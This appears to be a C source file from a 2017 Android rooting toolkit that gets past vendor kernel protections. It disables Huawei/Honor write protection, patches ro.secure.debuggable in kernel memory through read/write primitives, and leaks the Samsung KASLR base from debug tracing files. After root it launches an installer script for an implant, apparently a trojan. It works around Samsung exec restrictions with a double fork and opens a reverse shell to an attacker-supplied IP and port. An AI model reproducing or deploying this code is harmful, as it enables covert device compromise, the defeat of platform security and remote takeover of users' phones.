/*
 * by pass android kernel protect
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <mntent.h>

#include "silly.h"

#include "log.h"
#include "device.h"
#include "fn.h"

#include "param.h"
#include "dict.h"

#include "roothelper.h"
#include "shell.h"


int check_dm_verity_status() {
  int status = 0;
  char *check_mnt = "/system";
  char *filename = "/proc/self/mounts";
  FILE *mntfile;
  struct mntent *mntent;

  errno = 0;
  mntfile = setmntent(filename, "r");
  if (!mntfile) {
    log_dump(LOG_DEBUG, "[-] read mtab file failed!, errno = %d, msg = %s\n", errno, strerror(errno));
    return -1;
  }

  while((mntent = getmntent(mntfile)) != NULL) {
    if(!strncmp(mntent->mnt_dir, check_mnt, strlen(check_mnt) + 1)) {
      log_dump(LOG_DEBUG, "%s <- %s type %s (%s) freq %d, passno %d\n", 
        mntent->mnt_dir,
        mntent->mnt_fsname,
        mntent->mnt_type,
        mntent->mnt_opts,
        mntent->mnt_freq,
        mntent->mnt_passno);

      if(strstr(mntent->mnt_fsname, check_mnt)) {
        log_dump(LOG_DEBUG, "[-] dm-verity disable!\n");
        status = 0;
      } else 
      if(strstr(mntent->mnt_fsname, "dm")) {
        log_dump(LOG_DEBUG, "[+] dm-verity enable!\n");
        status = 1;
      } else {
        log_dump(LOG_DEBUG, "[!] dm-verity disable(default)!\n");
        status = 0;
      }

    }
  }

  endmntent(mntfile);
  return status;
}

static int huawei_high_level_mount_bypass() {

  short disable = 0;
  short status = 0;

  int fd, ret;
  int err = 0;

  errno = 0;
  fd = open("/proc/sys_wp_soft", O_RDWR);
  if (fd < 0) {
    log_dump(LOG_ERR, "[-] open false: fd = %d, errno = %d, msg = %s\n", fd, errno, strerror(errno));
    err = -1;
    goto out;
  }

  errno = 0;
  ret = write(fd, &disable, sizeof(disable));
  if (ret != sizeof(disable)) {
    log_dump(LOG_ERR, "[-] write false: ret = %d, errno = %d, msg = %s\n", ret, errno, strerror(errno));
    err = -2;
    goto out;
  }

  errno = 0;
  ret = read(fd, &status, sizeof(status));
  if (ret != sizeof(status)) {
    log_dump(LOG_ERR, "[-] read false: ret = %d, errno = %d, msg = %s\n", ret, errno, strerror(errno));
    err = -3;
    goto out;
  }

  log_dump(LOG_DEBUG, "\t [!] after patch, status = %d\n", atoi((char *)&status));

  if(atoi((char *)&status) != disable) {
    log_dump(LOG_ERR, "[-] patch value invalid!\n");
    err = -4;
    goto out;
  }

out:
  if(fd > 0) close(fd);

  return err;
}

static int huawei_mount_bypass(dict_t *dict) {
  log_dump(LOG_DEBUG, "[!] huawei mount bypass begin\n");

  int err = 0;

  if(huawei_high_level_mount_bypass() == 0) {
    log_dump(LOG_DEBUG, "\t [+] huawei high level mount bypass success!\n");
    // goto out;
  }

  unsigned long adp_ro_secure_debuggable, adp_ro_secure_debuggable_static;

  unsigned long patch_addr = 0;
  unsigned long disable = 0;
  unsigned long value = 0;
  unsigned long check_addr = 0;

  if(!dict_get_ulval(dict, k_ro_secure_debuggable, &adp_ro_secure_debuggable)) {
    log_dump(LOG_ERR, "\t [-] not found ro.secure.debuggable(%s)\n", k_ro_secure_debuggable);
    err = -1;
    goto out;
  }

  if(!dict_get_ulval(dict, k_ro_secure_debuggable_static, &adp_ro_secure_debuggable_static)) {
    log_dump(LOG_ERR, "\t [-] not found ro_secure_debuggable_static(%s)\n", k_ro_secure_debuggable_static);
    err = -1;
    goto out;
  }

  log_dump(LOG_DEBUG, "\t [!] begin to disable ro.secure.debuggable(%s).\n", k_ro_secure_debuggable);
  if(pipe_read_memory((void *)adp_ro_secure_debuggable, &patch_addr, sizeof(patch_addr)) < 0){
    log_dump(LOG_ERR, "\t [-] read 0x%08x ro.secure.debuggable failed! error info : %s\n", adp_ro_secure_debuggable, strerror(errno));
    err = -2;
    goto out;
  }
  log_dump(LOG_DEBUG, "\t read ro_secure_debuggable(0x%lx) = 0x%lx\n", adp_ro_secure_debuggable, patch_addr);

  if (patch_addr > KERNEL_START) {
    if(pipe_write_memory((void *)patch_addr, &disable, sizeof(disable)) < 0){
      log_dump(LOG_ERR, "\t [-] write 0x%08x ro.secure.debuggable failed! error info : %s\n", patch_addr, strerror(errno));
      err = -3;
      goto out;
    }
    log_dump(LOG_DEBUG, "\t write [ro_secure_debuggable](0x%lx) = 0x%lx\n", patch_addr, disable);
    check_addr = patch_addr;
  } else {
    if(pipe_write_memory((void *)adp_ro_secure_debuggable_static, &disable, sizeof(disable)) < 0){
      log_dump(LOG_ERR, "\t [-] write 0x%08x static.ro.secure.debuggable failed! error info : %s\n", adp_ro_secure_debuggable_static, strerror(errno));
      err = -3;
      goto out;
    }
    log_dump(LOG_DEBUG, "\t write ro_secure_debuggable_static(0x%lx) = 0x%lx\n", adp_ro_secure_debuggable_static, disable);
    check_addr = adp_ro_secure_debuggable_static;
  }
  // check patch success or not!
  if(pipe_read_memory((void *)check_addr, &value, sizeof(value)) < 0){
    err = -4;
    goto out;
  }
  
  log_dump(LOG_DEBUG, "\t after patch read 0x%lx = 0x%lx\n", check_addr, value);

  if(value != disable){
    log_dump(LOG_ERR, "[-] huawei mount bypass failed.\n");
    err = -5;
    goto out;
  }
  
  log_dump(LOG_ERR, "[+] huawei mount bypass successed.\n");

out:
  return err;
}

static int samsung_knox_bypass(dict_t *transl_param) {
  return 0;
}

static int vivo_mount_bypass(dict_t *transl_param) {
  return 0;

}

int vendor_protect_bypass(dict_t *transl_param) {
  log_dump(LOG_DEBUG, "[!] vendor protect bypass begin\n");
  int ret;
  char product_model[0xff] = { 0 };
  char product_band[0xff] = { 0 };

  if(getprop("ro.product.model", product_model, sizeof(product_model)) < 0 ) {
    log_dump(LOG_ERR, "\t [-] get ro.product.model error!\n");
    ret = -1;
    goto out;
  }
  log_dump(LOG_DEBUG, "\t [+] ro.product.model = %s\n", product_model);

  if(getprop("ro.product.brand", product_band, sizeof(product_band)) < 0) {
    log_dump(LOG_ERR, "\t [-] get ro.product.brand error!\n");
    ret = -1;
    goto out;
  }
  log_dump(LOG_DEBUG, "\t [+] ro.product.brand = %s\n", product_band);

  if (string_search(product_model, SAMSUNG) || string_search(product_band, SAMSUNG)) {
    log_dump(LOG_DEBUG, "\t [!] samsung vendor\n");
    return samsung_knox_bypass(transl_param);
  } else 
  if (string_search(product_model, HUAWEI) || string_search(product_band, HUAWEI)) {
    log_dump(LOG_DEBUG, "\t [!] huawei vendor\n");
    return huawei_mount_bypass(transl_param);
  } else
  if (string_search(product_model, HONOR) || string_search(product_band, HONOR)) {
    log_dump(LOG_DEBUG, "\t [!] honor vendor\n");
    return huawei_mount_bypass(transl_param);
  } else
  if (string_search(product_model, VIVO) || string_search(product_band, VIVO)) {
    log_dump(LOG_DEBUG, "\t [!] vivo vendor\n");
    return vivo_mount_bypass(transl_param);
  } else {
    log_dump(LOG_DEBUG, "[-] not need bypass vendor protect\n");
  }

out:
  return ret;
}

static int get_samsung_kernel_base(dict_t *dict, void *kaslr_kernel_base) {
  int fd, ret;
  int err = 0;
  char file_buf[0x400];
  memset(file_buf, 0, sizeof(file_buf));

  unsigned long adp_kaslr_2kfunc_addr;
  unsigned long adp_kaslr_2kfunc_offset;

  char *pos, *subpos, *split;

  if(!dict_get_ulval(dict, k_kaslr_2kfunc_offset, &adp_kaslr_2kfunc_offset)) {
    log_dump(LOG_ERR, "\t [-] not found k_kaslr_2kfunc_offset(%s)\n", k_kaslr_2kfunc_offset);
    err = -1;
    goto out;
  }

  errno = 0;
  fd = open("/sys/kernel/debug/tracing/printk_formats", O_RDONLY);
  if (fd < 0) {
    log_dump(LOG_ERR, "[-] open false: fd = %d, errno = %d, msg = %s\n", fd, errno, strerror(errno));
    err = -2;
    goto out;
  }

  while((ret = read(fd, file_buf, sizeof(file_buf))) != 0) {
    pos = (char *)&file_buf[0];

    while((split = strchr(pos, '\n')) != NULL) {
      *split = '\0';
      if((subpos = strstr(pos, "dpm_prepare")) != NULL ) {
        log_dump(LOG_DEBUG, "[+] find! pos = %s, subpos = %s\n", pos, subpos);
        goto find;
      }
      pos = split + 1;
    }

    memset(file_buf, 0, sizeof(file_buf));
  }

find:
  adp_kaslr_2kfunc_addr = strtoul(pos, NULL, 16);
  if(adp_kaslr_2kfunc_addr < KERNEL_START) {
    log_dump(LOG_ERR, "[-] calc adp_kaslr_2kfunc_addr error!\n");
    err = -2;
    goto out;
  }
  
  *(unsigned long *)kaslr_kernel_base = adp_kaslr_2kfunc_addr - adp_kaslr_2kfunc_offset;

out:
  if(fd) close(fd);
  return err;
}

/*
usage:
unsigned long adp_kaslr_kernel_base;

if(obtain_kaslr_kernel_base(transl_param_dict, &adp_kaslr_kernel_base) < 0 || 
  adp_kaslr_kernel_base < KERNEL_START) {
  log_dump(LOG_ERR, "[-] get adp_kaslr_kernel_base error!\n");
}
log_dump(LOG_DEBUG, "[+] adp_kaslr_kernel_base = 0x%lx\n", adp_kaslr_kernel_base);

*/

int obtain_kaslr_kernel_base(dict_t *transl_param, void *kaslr_kernel_base) {
  return get_samsung_kernel_base(transl_param, kaslr_kernel_base);
}


int silly_everything_after_root(dict_t *transl_param) {
  /* run script path */
  char adp_script_path[0x100] = { 0 };
  /* reverse shell ip&port */
  char adp_rshell_ip[0x40] = { 0 };
  char adp_rshell_port[0x10] = { 0 };
  char adp_work_dir[0x100] = { 0 };
  char run_cmd[0x200] = { 0 };

  unsigned long adp_rshell_status = 0;
  unsigned long adp_horse_status = 0;
  unsigned long adp_vendor_exec_restrict = 0;

  memset(adp_script_path, 0, sizeof(adp_script_path));
  memset(adp_rshell_ip, 0, sizeof(adp_rshell_ip));
  memset(adp_rshell_port, 0, sizeof(adp_rshell_port));
  memset(adp_work_dir, 0, sizeof(adp_work_dir));
  memset(run_cmd, 0, sizeof(run_cmd));

  dict_get_ulval(transl_param, r_rshell_status, &adp_rshell_status);
  dict_get_ulval(transl_param, r_horse_status, &adp_horse_status);
  dict_get_str(transl_param, r_script_path, adp_script_path, sizeof(adp_script_path));
  dict_get_str(transl_param, r_rshell_ip, adp_rshell_ip, sizeof(adp_rshell_ip));
  dict_get_str(transl_param, r_rshell_port, adp_rshell_port, sizeof(adp_rshell_port));

  log_dump(LOG_DEBUG, "script: %s\n", adp_script_path);
  log_dump(LOG_DEBUG, "rshell: ip = %s, port = %s\n", adp_rshell_ip, adp_rshell_port);

  if(strlen(adp_script_path)) {
    if(full_path_to_dir(adp_script_path, adp_work_dir) == NULL) {
      log_dump(LOG_ERR, "[-] extract dir from %s error!\n", adp_script_path);
      strncpy(adp_work_dir, ".", 1);
    }
    log_dump(LOG_DEBUG, "adp_work_dir = %s\n", adp_work_dir);
  }

  if(adp_horse_status > 0) {
    sprintf(run_cmd, "%s %s %s %s", adp_script_path, adp_work_dir, adp_rshell_ip, adp_rshell_port);
  } else {
    sprintf(run_cmd, "%s %s", adp_script_path, adp_work_dir);
  }

  dict_get_ulval(transl_param, k_vendor_exec_restrict, &adp_vendor_exec_restrict);

  // bypass samsung exec restrict
  if(adp_vendor_exec_restrict == 1) {
    dup2(1, 2);
    if ((getuid() == 0) && (geteuid() == 0)) {
      pid_t pid1, pid2;

      pid1 = fork();
      pid2 = fork();

      if (pid1 == 0) {
        if (pid2 == 0) {
          while (getppid() != 1 || getuid() != 0) usleep(100);
          char *argvs[] = {"install.sh", adp_work_dir, adp_rshell_ip, adp_rshell_port, NULL};
          char *envps[] = {"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin", NULL};
          execve(adp_script_path, argvs, envps);
        } else {
          exit(0);
        }
      } else {
        // exit(0);
      }
    }

  } else {
    run_shell_commond("/system/bin/sh", run_cmd);
  }

  if(adp_rshell_status > 0) {
    if(strlen(adp_rshell_ip) && strlen(adp_rshell_port)) {
      rshell_simple(adp_rshell_ip, adp_rshell_port);
    }
  }

  return 0;

}









